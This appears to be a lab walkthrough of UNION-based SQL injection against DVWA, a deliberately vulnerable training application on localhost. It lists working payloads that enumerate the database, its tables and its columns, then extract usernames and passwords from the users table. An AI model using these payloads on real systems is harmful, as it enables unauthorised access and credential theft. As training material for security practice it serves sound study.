Examine SQL Injection: Extracting Data using the UNION attack
1.	Set DVWA Security Level:
Go to DVWA Security → Set security level to Low.
2.	Open the Vulnerable Page:
URL: http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
3.	Find Maximum Number of Columns:
Enter the following payloads one by one in the User ID field until an error occurs:
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -
➤ The highest number before the error = number of columns.
(Here, maximum column = 2)
4.	Find Which Column is Reflected:
Test both payloads:
1' UNION SELECT 'FOO',NULL-- -
1' UNION SELECT NULL,'FOO'-- -
➤ The column showing “FOO” is the reflected column.
5.	Get the Current Database Name:
o	If first column reflected:
1' UNION SELECT DATABASE(),NULL-- -
o	If second column reflected:
1' UNION SELECT NULL,DATABASE()-- -
➤ Database name = dvwa
	6.	List All Tables in the Database:
	o	If first column reflected:
1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=DATABASE()-- -
	o	If second column reflected:
1' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=DATABASE()-- -
	➤ Tables found = users, guestbook


	7.	List All Columns in ‘users’ Table:
	o	If first column reflected:
1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
	o	If second column reflected:
1' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'-- -
	➤ Columns found = user_id, first_name, last_name, user, password, avatar, 	last_login, failed_login
	8.	Extract Usernames and Passwords:
	o	If first column reflected:
1' UNION SELECT CONCAT(user,0x3a,password),NULL FROM users-- -
	o	If second column reflected:
1' UNION SELECT NULL,CONCAT(user,0x3a,password) FROM users-- -
9.	Extract Rows One by One (Optional):
1' UNION SELECT CONCAT(user,0x3a,password),NULL FROM users LIMIT 0,1-- -
1' UNION SELECT CONCAT(user,0x3a,password),NULL FROM users LIMIT 1,1-- -
1' UNION SELECT CONCAT(user,0x3a,password),NULL FROM users LIMIT 2,1-- -
10.	Extract Data from ‘guestbook’ Table (Optional):
1' UNION SELECT CONCAT(name,0x3a,comment),NULL FROM guestbook-- -
11.	If Type Error Occurs (Optional):
1' UNION SELECT CAST(CONCAT(user,0x3a,password) AS CHAR),NULL FROM users-- -
